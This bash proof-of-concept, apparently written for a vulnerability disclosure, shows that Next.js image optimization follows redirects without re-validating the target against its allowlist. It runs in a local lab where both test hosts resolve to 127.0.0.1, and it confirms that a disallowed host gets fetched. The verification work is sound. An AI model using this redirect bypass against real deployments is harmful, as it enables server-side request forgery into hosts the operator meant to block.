#!/bin/bash
# PoC 2: fetchExternalImage() follows upstream redirects but never re-checks the
# redirect target against images.remotePatterns / images.domains.  Only the
# private-IP guard is re-applied.
#
# Isolation: images.dangerouslyAllowLocalIP = true disables ONLY the private-IP
# guard, leaving hasRemoteMatch() fully in force.  So a hit on notallowed.test
# can only mean the allowlist was not consulted for the redirect target.
set -u
cd /home/user/nextlab

echo "=== config ==="
sed -n '/images:/,/},/p' next.config.js | sed 's/^/   /'
echo "   /etc/hosts: allowed.test and notallowed.test both -> 127.0.0.1"

for p in $(ps -eo pid,args | awk '/redir_server\.py|next-server/ && !/awk/ {print $1}'); do kill "$p" 2>/dev/null; done
sleep 2
setsid python3 redir_server.py > redir.log 2>&1 < /dev/null &
sleep 2
: > redir.log; : > server.log
PORT=3000 setsid npx next start > server.log 2>&1 < /dev/null &
sleep 9

echo
echo "=== 1. sanity: the allowlisted host issues an open redirect ==="
curl -s -o /dev/null -w "   %{http_code} -> %{redirect_url}\n" -H "Host: allowed.test" http://127.0.0.1/x.png

echo
echo "=== 2. attacker request, naming ONLY the allowlisted host ==="
echo "   GET /_next/image?url=http://allowed.test/x.png&w=640&q=75"
curl -s -o /dev/null -w "   http status = %{http_code}\n" \
  "http://127.0.0.1:3000/_next/image?url=http%3A%2F%2Fallowed.test%2Fx.png&w=640&q=75"
sleep 1

echo
echo "=== 3. which upstream hosts the server actually contacted ==="
sed 's/^/   /' redir.log
if grep -q "NOT-ALLOWLISTED HOST REACHED" redir.log; then
  echo "   -> notallowed.test is NOT in remotePatterns, yet it was fetched."
  echo "      The redirect target is not re-validated against the allowlist."
fi

echo
echo "=== 4. what Next.js logged ==="
grep -E "upstream image|valid image" server.log | sed 's/^/   /' || echo "   (none)"
